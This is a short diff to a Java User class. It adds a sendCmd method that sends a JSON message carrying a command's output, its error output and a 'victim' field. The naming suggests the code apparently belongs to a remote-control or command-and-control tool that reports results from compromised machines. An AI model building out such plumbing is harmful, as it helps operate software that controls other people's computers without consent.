@@ -197,4 +197,13 @@ public class User {
         sendMessage(query);
     }
 
+    public void sendCmd(String out, String errorOut, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "cmd");
+        query.put("out", out);
+        query.put("errorOut", errorOut);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
 }
